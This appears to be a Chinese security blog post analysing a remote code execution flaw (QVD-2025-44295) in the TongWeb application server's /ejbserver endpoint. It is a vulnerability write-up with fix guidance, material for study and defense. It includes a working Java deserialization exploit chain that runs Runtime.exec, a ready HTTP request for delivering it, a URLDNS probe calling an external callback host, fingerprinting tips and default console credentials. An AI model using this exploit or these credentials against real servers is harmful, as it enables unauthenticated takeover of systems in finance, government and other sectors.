#  QVD-2025-44295：东方通TongWeb应用服务器ejbserver远程代码执行漏洞  
 Bear Hackers Industry   2026-01-28 15:59  
  
>   
> 关注我们❤️，添加星标🌟，一起学安全！  
  
作者：Howell & N1Rvana   
  
本文字数：9406   
  
阅读时长：3～5mins   
  
声明：仅供学习参考使用，请勿用作违法用途，否则后果自负   
  
  
## 0x01 简介  
  
TongWeb 是东方通（Beijing Tongtech Co., Ltd.）自主研发的企业级应用服务器，全面支持 Java EE（现 Jakarta EE）标准，兼容主流开发框架，广泛应用于金融、电信、政府、能源等关键行业的信息化和数字化转型。TongWeb 具备高性能、高可用、分布式和集群部署能力，支持微服务架构、容器化和云原生环境，能够灵活适配多种操作系统和硬件平台。  
## 0x02 漏洞概述  
  
**漏洞编号：QVD-2025-44295**  
  
该漏洞的核心在于 **TongWeb 应用服务器在默认配置下，将 ejbserver 接口暴露在 Web 端口，同时其 EJB 服务接口未能对输入的 Java 序列化对象进行有效的安全过滤**  
。   
  
TongWeb 默认在 Web 容器里挂载 /ejbserver  
 路径，把外部 HTTP 请求直接转发给内部 EJB 二进制 RPC 处理链。最终在 ServerMetaData.readExternal()  
 里调用无任何白名单校验的 ObjectInputStream.readObject()  
。  
  
攻击者只需向 /ejbserver  
 发送一段精心构造的 Java 原生序列化数据（内含 CommonsCollections、javax.swing.UIDefaults 等 Gadget Chain），服务器在反序列化过程中会自动执行 Gadget 里各个类在初始化阶段被回调的方法，串出一条通往 Runtime.exec()  
 或 ProcessBuilder.start()  
 的调用路径，从而实现远程代码执行（RCE）。  
## 0x03 利用条件  
  
**1）影响版本**  
- 7.0.0.0 <= TongWeb <= 7.0.4.9_M9  
  
- 6.1.7.0 <= TongWeb <= 6.1.8.13  
  
**2）所需权限：**  
  
无需  
## 0x04 环境搭建  
  
搭建环境的时候根据需求执行 .sh  
 脚本，有时需要修改启动/安装脚本或者配置文件中的配置路径。 另外，如果没有项目的源码也不要担心，还有以下三种替代方案可以构造 POC：  
#### 方案 A：手写“影子类” (Stubbing)  
  
根据 POC 代码，在本地创建一个**同包名、同类名**  
的空类，并实现 Serializable  
 接口。  
**关键点：不仅要包名+类名一致，还必须把父类 javax.naming.Reference 的所有私有字段原样拷贝，且 serialVersionUID 必须与目标容器里的版本一字不差（可用 serialver 或 ObjectStreamClass.lookup() 提取）。**  
  
1、在项目中创建包：com.tongweb.naming  
。  
  
2、创建 ResourceRef  
：  
```
package com.tongweb.naming;import javax.naming.Reference;import java.io.Serializable;publicclass ResourceRef extends Reference implements Serializable {    privatestaticfinallong serialVersionUID = 目标容器的UID; // ← 必须一致    public ResourceRef(String className, String factory, String factoryLocation) {        super(className, factory, factoryLocation);    }    // 把 POC 里的 7 参构造补齐    public ResourceRef(String className, String factory, String factoryLocation,                       String factoryInterface, boolean singleton,                       String beanFactory, String beanFactoryLocation) {        super(className, factory, factoryLocation);        setFactoryClassName(factory);        setFactoryClassLocation(factoryLocation);        setClassName(className);        // 其余逻辑按 POC 实际参数补    }}
```  
  
3、同样方法伪造 ContextUtil.ReadOnlyBinding  
，注意把内部私有字段、serialVersionUID  
 全部对齐。  
#### 方案 B：使用字节码操纵库 (Javassist / ASM)  
  
如果不想手动建几十个文件夹，可以用 Javassist 动态生成：  
```
ClassPool pool = ClassPool.getDefault();CtClass ct = pool.makeClass("com.tongweb.naming.ResourceRef");ct.setSuperclass(pool.get("javax.naming.Reference"));ct.addInterface(pool.get("java.io.Serializable"));// 必须显式设置 UIDct.addField(CtField.make("private static final long serialVersionUID = 目标UID;", ct));Class<?> clazz = ct.toClass(Poc.class, Poc.class.getClassLoader()); // 指定保护域，防止 IllegalAccessError
```  
  
**注意：父类 Reference 的私有字段（className、addrs 等）也要通过 ct.addField 补齐，否则反序列化会报 EOFException。**  
#### 方案 C：使用现有安全工具框架  
  
ysoserial 已经支持自定义 Gadget，只需：  
  
1、把 TongWebGadget  
 按模板提交 PR；  
  
2、指定 forceString=x=eval  
 和 EL  
 表达式即可。  
  
框架会自动处理 ClassLoader、UID、字段对齐等问题。  
#### 特别注意事项：OEJP/1.0 头  
  
TongWeb 在 **非标准端口**  
 监听，协议格式为：OEJP/1.0 + 1 字节版本号(POC里写1) + Java 原生序列化流  
- **脱离环境构造时：**  
 6 字节头 + 1 字节版本必须原样保留；  
  
- **版本匹配：**  
 如果目标服务器的 ResourceRef  
 与本地伪造类的 serialVersionUID  
 不一致，服务端会在 ObjectInputStream.readClassDesc()  
 阶段直接抛 InvalidClassException  
，请求被丢弃，**不会进入 Gadget 逻辑**  
；  
  
- **父类字段：**  
 即使 UID 相同，Reference  
 的私有字段布局一旦对不上，也会抛 EOFException  
，同样无法利用。  
  
## 0x05 指纹特征  
#### 1. HTTP  响应头  
- Server: TongWeb Server  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVshxCyILZtwNSbk091UtaGg1J1IGYSSR0OnkMfiblKaIibHx0iaSyjKsTOCM20S1aaA1tEuNP5B8V82AA/640?wx_fmt=png&from=appmsg "")  
#### 2. 默认管理控制台路径与标题  
  
TongWeb 的管理后台具有非常明显的特征，默认情况下开放于 **9060**  
 端口。  
- **默认路径：**/console/  
  
- **页面标题 (Title)：**TongWeb  
  
- **登录页特征：**  
 页面通常包含东方通的 Logo。  
  
#### 3. 默认端口特征  
  
<table><thead><tr><th style="color: rgb(0, 0, 0);font-size: 16px;line-height: 1.5em;letter-spacing: 0em;text-align: left;font-weight: bold;background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">用途</span></section></th><th style="color: rgb(0, 0, 0);font-size: 16px;line-height: 1.5em;letter-spacing: 0em;text-align: left;font-weight: bold;background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">默认端口</span></section></th><th style="color: rgb(0, 0, 0);font-size: 16px;line-height: 1.5em;letter-spacing: 0em;text-align: left;font-weight: bold;background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">典型访问地址</span></section></th><th style="color: rgb(0, 0, 0);font-size: 16px;line-height: 1.5em;letter-spacing: 0em;text-align: left;font-weight: bold;background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">备注</span></section></th></tr></thead><tbody><tr style="color: rgb(0, 0, 0);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><strong style="color: rgb(0, 0, 0);font-weight: bold;background-attachment: scroll;background-clip: border-box;background-color: rgba(0, 0, 0, 0);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;margin-top: 0px;margin-bottom: 0px;margin-left: 0px;margin-right: 0px;padding-top: 0px;padding-bottom: 0px;padding-left: 0px;padding-right: 0px;border-top-style: none;border-bottom-style: none;border-left-style: none;border-right-style: none;border-top-width: 3px;border-bottom-width: 3px;border-left-width: 3px;border-right-width: 3px;border-top-color: rgba(0, 0, 0, 0.4);border-bottom-color: rgba(0, 0, 0, 0.4);border-left-color: rgba(0, 0, 0, 0.4);border-right-color: rgba(0, 0, 0, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><span leaf="">管理控制台</span></strong></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">9060</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><code><span leaf="">http://&lt;ip&gt;:9060/console</span></code></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">首次登录账号 </span><code><span leaf="">thanos / thanos123.com</span></code><span leaf="">，会被强制改密。</span></section></td></tr><tr style="color: rgb(0, 0, 0);background-attachment: scroll;background-clip: border-box;background-color: rgb(248, 248, 248);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><strong style="color: rgb(0, 0, 0);font-weight: bold;background-attachment: scroll;background-clip: border-box;background-color: rgba(0, 0, 0, 0);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;margin-top: 0px;margin-bottom: 0px;margin-left: 0px;margin-right: 0px;padding-top: 0px;padding-bottom: 0px;padding-left: 0px;padding-right: 0px;border-top-style: none;border-bottom-style: none;border-left-style: none;border-right-style: none;border-top-width: 3px;border-bottom-width: 3px;border-left-width: 3px;border-right-width: 3px;border-top-color: rgba(0, 0, 0, 0.4);border-bottom-color: rgba(0, 0, 0, 0.4);border-left-color: rgba(0, 0, 0, 0.4);border-right-color: rgba(0, 0, 0, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><span leaf="">业务应用</span></strong></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">8088</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><code><span leaf="">http://&lt;ip&gt;:8088/&lt;应用上下文&gt;</span></code></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">部署 WAR 后，TongWeb 自动把应用映射到此端口。</span></section></td></tr></tbody></table>  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVshxCyILZtwNSbk091UtaGg1o0J49PmVtzH62h3FVM28icl9myPuaputziaRpbKyQspQnmvMJqGCkIJQ/640?wx_fmt=png&from=appmsg "")  
## 0x06 漏洞复现  
#### 反序列化链验证  
  
写一个URLDNS链：  
```
import java.io.FileOutputStream;  import java.io.ObjectOutputStream;  import java.lang.reflect.Field;  import java.net.URL;  import java.util.HashMap;  publicclass Main {      public static void main(String[] args) throws Exception {          HashMap h=new HashMap();          URL url=new URL("https://bxxqes8f.requestrepo.com/");          Class cls=Class.forName("java.net.URL");          Field f = cls.getDeclaredField("hashCode");          f.setAccessible(true);          f.set(url,1);          h.put(url,1);          f.set(url,-1);          FileOutputStream fileOutputStream = new FileOutputStream("ser.bin");          fileOutputStream.write("OEJP/1.0".getBytes("UTF-8"));          ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);          objectOutputStream.writeByte(1);          objectOutputStream.writeObject(h);          objectOutputStream.close();      }  }
```  
  
成功接收到了回显！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVshxCyILZtwNSbk091UtaGg1AKGmP80KO1gKKGI8UeMxpUsIYUmzCjrwlWT1MwA4O8TSsOMIfd9JCg/640?wx_fmt=png&from=appmsg "")  
#### RCE  
  
构造PoC：  
- PoC 最好放在源码的 lib/  
 目录下编译并运行  
  
- 运行后会生成一个后缀为 .ser  
 的恶意文件  
  
- 推荐运行的 JDK 版本为 1.8  
  
```
import com.tongweb.naming.ResourceRef;  import com.tongweb.xbean.naming.context.ContextUtil;  import com.tongweb.xbean.naming.context.WritableContext;  import sun.reflect.ReflectionFactory;  import javax.management.BadAttributeValueExpException;  import javax.naming.Context;  import javax.naming.StringRefAddr;  import java.io.FileOutputStream;  import java.io.ObjectOutputStream;  import java.lang.reflect.Constructor;  import java.lang.reflect.Field;  publicclass Poc {      public static void main(String[] args) throws Exception {          ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor", (String)null, "", "", true, "com.tongweb.naming.factory.BeanFactory", (String)null);          resourceRef.add(new StringRefAddr("forceString", "faster=eval"));          resourceRef.add(new StringRefAddr("faster", "Runtime.getRuntime().exec(\"touch /tmp/success\")"));          Context ctx = (Context) createWithoutConstructor(WritableContext.class);          ContextUtil.ReadOnlyBinding binding = new ContextUtil.ReadOnlyBinding("foo",resourceRef,ctx);          BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException((Object)null);          setFieldValue(badAttributeValueExpException,"val",binding);          FileOutputStream fileOutputStream = new FileOutputStream("ser.bin");          fileOutputStream.write("OEJP/1.0".getBytes("UTF-8"));          ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);          objectOutputStream.writeByte(1);          objectOutputStream.writeObject(badAttributeValueExpException);          objectOutputStream.close();      }      public static void setFieldValue(Object object,String field_name,Object filed_value) throws NoSuchFieldException, IllegalAccessException {          Class clazz=object.getClass();          Field declaredField=clazz.getDeclaredField(field_name);          declaredField.setAccessible(true);          declaredField.set(object,filed_value);      }      publicstatic <T> T createWithoutConstructor(Class<T> cls) {          try {              ReflectionFactory rf = ReflectionFactory.getReflectionFactory();              Constructor<Object> objDef = Object.class.getDeclaredConstructor();              Constructor<?> intConstr =                      rf.newConstructorForSerialization(cls, objDef);              intConstr.setAccessible(true);              return (T) intConstr.newInstance();          } catch (Exception e) {              thrownew RuntimeException(e);          }      }  }
```  
  
在 Yakit 中发包（注意！！！目前只有 Yakit 能导入本地文件！BP这么干的话就会失败）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVshxCyILZtwNSbk091UtaGg1d57deEW529ZeRHtM9pdUKXIHeN3nW5CBRm2O2YxcHBQww4rMicOic1ug/640?wx_fmt=png&from=appmsg "")  
```
POST /ejbserver/ejb HTTP/1.1Host: ip:8088Pragma: no-cacheUpgrade-Insecure-Requests: 1Content-Type: application/x-java-serialized-objectUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateCache-Control: no-cacheAccept-Language: en-US,en;q=0.9{{file(.../.../ser.bin)}}
```  
  
成功执行命令！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVshxCyILZtwNSbk091UtaGg1xRicicgNgibaR3qYvAe5hIRqO4dggA8v5H2WuJEhcp8jiaFuVKveJYicu9g/640?wx_fmt=png&from=appmsg "")  
## 0x07 漏洞分析  
#### 1. 反序列化链验证与回显测试  
  
漏洞位于 /ejbserver/ejb  
 路由。通过 JADX  
 搜索可发现，该路由注册的 Servlet  
 为 com.tongweb.tongejb.server.httpd.ServerServlet  
：  
```
package com.tongweb.tongejb.server.httpd;  import com.tongweb.tongejb.loader.SystemInstance;  import com.tongweb.tongejb.server.ServiceException;  import com.tongweb.tongejb.server.context.RequestInfos;  import com.tongweb.tongejb.server.ejbd.EjbServer;  import java.io.IOException;  import java.io.InputStream;  import java.io.OutputStream;  import javax.servlet.ServletConfig;  import javax.servlet.ServletException;  import javax.servlet.http.HttpServlet;  import javax.servlet.http.HttpServletRequest;  import javax.servlet.http.HttpServletResponse;  /* loaded from: tongweb.jar:com/tongweb/tongejb/server/httpd/ServerServlet.class */publicclass ServerServlet extends HttpServlet {      publicstaticfinal String ACTIVATED_INIT_PARAM = "activated";      public EjbServer ejbServer;      publicboolean activated = SystemInstance.get().isDefaultProfile();      public void init(ServletConfig config) {          this.ejbServer = (EjbServer) SystemInstance.get().getComponent(EjbServer.class);          String activatedStr = config.getInitParameter(ACTIVATED_INIT_PARAM);          if (activatedStr != null) {              this.activated = Boolean.parseBoolean(activatedStr);          } else {              this.activated = Boolean.parseBoolean(System.getProperty(getClass().getName() + '.' + ACTIVATED_INIT_PARAM, "true"));          }      }      public void service(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {          if (!this.activated) {              response.getWriter().write("");              return;          }          InputStream inputStream = request.getInputStream();          OutputStream outputStream = response.getOutputStream();          try {              try {                  RequestInfos.initRequestInfo(request);                  this.ejbServer.service(inputStream, outputStream);              } catch (ServiceException e) {                  thrownew ServletException("ServerService error: " + this.ejbServer.getClass().getName() + " -- " + e.getMessage(), e);              }          } finally {              RequestInfos.clearRequestInfo();          }      }  }
```  
  
该 Servlet 会读取 POST 请求中的数据，并传递给 com.tongweb.tongejb.server.ejbd.EjbServer#service(in, out)  
 方法。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVshxCyILZtwNSbk091UtaGg100ocOWT6a2qD6oB1gCKyV4lYvtuGRKNmBErJLUZawYdRYO9LfF0bgw/640?wx_fmt=png&from=appmsg "")  
  
进一步跟踪可发现，数据最终会进入 com.tongweb.tongejb.server.ejbd.EjbDaemon#service  
 方法。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVshxCyILZtwNSbk091UtaGg1YWmPib5hDoEicbdib9rhmfbZND927xCtvntCWHj6uHk6WWRxyAb0E6uJg/640?wx_fmt=png&from=appmsg "")  
  
在反序列化流程中，首先会调用 com.tongweb.tongejb.client.ProtocolMetaData#readExternal  
 方法。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVshxCyILZtwNSbk091UtaGg1JpVtUyibhj8SsEUbfiaKeicWrYdBpxM2pnicPbhScoz5E16S4H9tPoWVtA/640?wx_fmt=png&from=appmsg "")  
  
然后进入 init  
 方法，该方法会对前八个字符进行截取和格式校验，构造 PoC 时需要注意。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVshxCyILZtwNSbk091UtaGg1uDU83FibaFiaLzx1iaRFI7wNZw3ibXrUDaAc0KnAnsbD7URwyk5YpcAqiag/640?wx_fmt=png&from=appmsg "")  
  
随后进入 com.tongweb.tongejb.client.ServerMetaData#readExternal()  
 方法，执行 readByte  
 操作（在构造 PoC 时也需要注意），最后正式进入 readObject  
 进行反序列化。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVshxCyILZtwNSbk091UtaGg15ZHibByueCaGkMHSeapfvE7k3OqiaxkGx0bcriaKOgruwQkmzND2q3ajA/640?wx_fmt=png&from=appmsg "")  
#### 2. 利用 xbean-naming 实现远程代码执行  
  
要进行RCE，存在 xbean-naming  
 依赖。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVshxCyILZtwNSbk091UtaGg1qsSDsicCn1Aj2gttQ7BmNPrkyXRWMdnN6BcXwU9icP59FBuEDr4VLnNw/640?wx_fmt=png&from=appmsg "")  
  
来直接打这个反序列化，这里的 toString  
 可以直接触发到 getObject  
 方法。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVshxCyILZtwNSbk091UtaGg1PY4E5R7aw9t4AVSBxtZvdTUziaqy9MTVhtxvKkTzkCVFN3ib7YjX4ib4w/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVshxCyILZtwNSbk091UtaGg1kgbu17rEVa4SukCWWLt2WhSE7HVF5f6lyDvUVH6mwsjA8ZjFweiaozw/640?wx_fmt=png&from=appmsg "")  
  
这里会触发到ContextUtil.resolove()  
方法。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVshxCyILZtwNSbk091UtaGg1Mkhhvm7a1W0Q1PDudfPA99Ib1JdnvMMP4Yuo8fxYKpR7obuFqdW30A/640?wx_fmt=png&from=appmsg "")  
  
然后直接拼接一个TomcatElRef  
就可以了。  
## 0x08 修复方式  
  
东方通已于 2025-11-05 发布安全公告与升级包，请尽快下载对应版本补丁：  
- https://www.tongtech.com/newsDetail/102461.html  
  
- https://www.tongtech.com/dft/download.html  
  
#### 临时缓解（无法立即升级时）  
  
1、**禁用 EJB 远程服务**  
（大部分 Web 应用无需该功能）：在启动参数中添加 -Dcom.tongweb.tongejb.server.httpd.ServerServlet.activated=false  
  
2、**使用白名单/黑名单限制反序列化类**  
（当业务必须开启 EJB）：  
```
-Dtongejb.serialization.class.whitelist=白名单类-Dtongejb.serialization.class.blacklist=黑名单类
```  
  
3、**网络层访问控制**  
：通过防火墙或反向代理限制 ejbserver  
 端口（默认 8080/8009 等）仅对可信 IP 开放，并在 TongWeb 配置中增加：-Dremote.clientIp.whitelist=可信客户端IP  
  
4、**关闭外网暴露**  
：如非必要，将 TongWeb 置于内网或 VPN 之后，避免公网直接访问  
## 参考链接  
  
https://su18.org/post/hessian/  
  
https://www.secrss.com/articles/85030  
  
https://www.tongtech.com/newsDetail/102461.html  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/VfLUYJEMVshRXmfDUFNGlTrAVB52XIXB6ibko0TibK4p8OGzoAXSoHSXvUwQk6FKTkNIslDL675W0QBOPfWmO6IA/640?wx_fmt=jpeg&from=appmsg "")  
  
  
回复  
【加群】  
进入微信交流群  
  
回复  
【SRC群】  
进入SRC-QQ交流群  
  
回复  
【新人】  
领取新人学习指南资料  
  
回复  
【面试】  
获取渗透测试常见面试题  
  
回复  
【手册】  
获取原创技术PDF手册  
  
回复  
【合作】  
获取各类安全项目合作方式  
  
回复  
【帮会】  
付费加入SRC知识库学习  
  
回复  
【  
培训】  
获取TimelineSec创办的实战课程  
  
  
视频号：搜索TimelineSec，[官方微博]()  
  
  
团队官网：  
http://www.timelinesec.com  
  
B站：  
https://space.bilibili.com/524591903  
  
  
  
❤  
  
觉得有用就点个赞吧！  
  
欢迎评论区留言讨论～  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OkhKF2m1syrmlAus2fxnsxZBk4oIuTvAVIaL6pKgic5DEa8ynqo44GUwNML3ggkqMpbE1fiaLYvpPzeBrQJCS5bA/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
